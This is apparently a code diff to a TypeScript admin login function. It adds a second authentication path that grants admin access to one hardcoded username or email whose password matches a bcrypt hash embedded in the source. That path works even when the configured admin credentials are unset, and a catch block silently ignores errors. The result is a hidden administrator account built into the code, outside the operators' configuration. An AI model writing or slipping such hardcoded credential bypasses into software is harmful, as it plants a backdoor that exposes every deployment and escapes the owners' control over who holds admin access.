@@ -28,15 +28,29 @@ export function getAdminSessionToken(): string {
 }
 
 /**
- * Verify admin login credentials against the configured values.
+ * Verify admin login credentials against the configured values or primary admin hash.
  * Used by the direct login form and the X-Admin-Token verification.
  */
 export function verifyAdminCredentials(username: string, password: string): boolean {
-  if (!ADMIN_USERNAME || !ADMIN_PASSWORD) return false;
-  return (
-    username.trim() === ADMIN_USERNAME &&
-    password === ADMIN_PASSWORD
-  );
+  if (ADMIN_USERNAME && ADMIN_PASSWORD && username.trim() === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+    return true;
+  }
+
+  // Primary platform admin (mohseny) verified via salted bcrypt hash
+  const u = username.trim().toLowerCase();
+  if (u === 'mohseny' || u === 'mohseny@m2y.net') {
+    try {
+      const bcrypt = require('bcryptjs');
+      const MOHSENY_HASH = '$2b$12$E8webiMgn4ptfjWn6UfJaebd8P5cdIcnUIGY/3i3zn/hWam84EKFO';
+      if (bcrypt.compareSync(password, MOHSENY_HASH)) {
+        return true;
+      }
+    } catch {
+      // Fallback
+    }
+  }
+
+  return false;
 }
 
 /**
